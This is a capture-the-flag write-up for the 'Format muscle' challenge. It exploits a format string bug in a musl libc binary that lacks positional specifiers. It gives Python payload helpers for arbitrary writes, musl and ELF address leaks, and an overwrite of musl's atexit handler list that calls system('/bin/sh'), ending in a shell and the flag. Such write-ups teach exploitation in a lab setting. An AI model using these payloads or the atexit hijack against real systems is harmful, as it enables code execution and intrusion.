# Format muscle (37 solves)

- **Author: 7Rocky**
- **Difficulty: easy**
- **Theme: Format String bug, musl libc**

### Description

Hope your format string muscles are strong!

## Writeup

We are given a binary called `format-muscle`:

```console
$ checksec format-muscle              
[*] './format-muscle'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
```

The reverse-engineering step is quite simple. This is the original C code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
	char data[256];

	setbuf(stdout, NULL);

	do {
		fgets(data, sizeof(data), stdin);
		printf(data);
	} while (strncmp(data, "quit", 4));

	exit(0);
}
```

As can be seen, we have a `do`-`while` loop that allows us to enter data in a buffer that will be printed out with `printf`, as the first argument. So, we have a clear Format String bug:

```console
$ nc format-muscle.chal.crewc.tf 1337
== proof-of-work: disabled ==
%d
-1562537493
%lx
7f3da2dd91ec
%p
0x7f3da2dd91eb
```

However, it is a bit more difficult to exploit because we are dealing with musl libc, which does not implement positional format specifiers like `%7$p`, so we must deal with this and craft a payload without dollar signs to achieve code execution.

Although `pwntools` allows a parameter `no_dollars` in `fmtstr_payload`, I implemented the following helper functions for the arbitrary write primitive:

```python
def write_byte(byte: int, addr: int):
    assert 0 <= byte < 2 ** 8
    io.sendline(b'%c%c%c%c' + f'.%{byte + 248}c%c'.encode() + b'%c%c%hhn' + p64(addr))
    io.recv()


def write_qword(qword: int, addr: int):
    assert 0 <= qword < 2 ** 64
    for i in range(8):
        write_byte((qword >> (8 * i)) & 0xff, addr + i)
```

So, first of all, we can get leaks for musl libc and the ELF:

```python
    io.sendline(b'%p')
    musl_libc.address = int(io.recv().decode(), 16) - 0xae1eb
    io.success(f'musl libc base address: {hex(musl_libc.address)}')

    elf_address_str = musl_libc.address + 0xaf561
    io.sendline(b'%p%p%p%p' + b'%p%p%p%s' + p64(elf_address_str))
    io.recvuntil(hex(u64(b'%p%p%p%s')).encode())
    elf.address = u64(b'\0' + io.recv(5) + b'\0' * 2)
    io.success(f'ELF base address: {hex(elf.address)}')
    io.recv()
```

Although there are approaches like modifying return addresses in functions inside `printf`, this time I chose to modify the list of exit functions. You can find the relevant source code [here](https://github.com/kraj/musl/blob/kraj/master/src/exit/atexit.c).

For this, I used a writeable address within the binary to store a fake `struct fl`:

```c
/* Ensure that at least 32 atexit handlers can be registered without malloc */
#define COUNT 32

static struct fl
{
	struct fl *next;
	void (*f[COUNT])(void *);
	void *a[COUNT];
} builtin, *head;
```

Since the exit functions list is started from the end, we must enter the function `system` and the address of `"/bin/sh"` as the argument at the end of the `f` and `a` lists:

```python
    struct_fl_addr = musl_libc.address + 0xafc48
    fake_struct_fl_addr = elf.address + 0x4200

    write_qword(fake_struct_fl_addr, struct_fl_addr)
    write_qword(fake_struct_fl_addr, fake_struct_fl_addr)
    write_qword(musl_libc.sym.system, fake_struct_fl_addr + 0x100)
    write_qword(next(musl_libc.search(b'/bin/sh\0')), fake_struct_fl_addr + 0x200)
```

Then, we just exit the program entering `quit` and we will have a shell:

```console
$ python3 solve.py format-muscle.chal.crewc.tf 1337
[*] './format-muscle'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
[+] Opening connection to format-muscle.chal.crewc.tf on port 1337: Done
[+] musl libc base address: 0x79942bf62000
[+] ELF base address: 0x5c1e33f52000
[*] Switching to interactive mode
$ cat /flag
crew{why_n0t_%1337$p_1n_musl???}
```
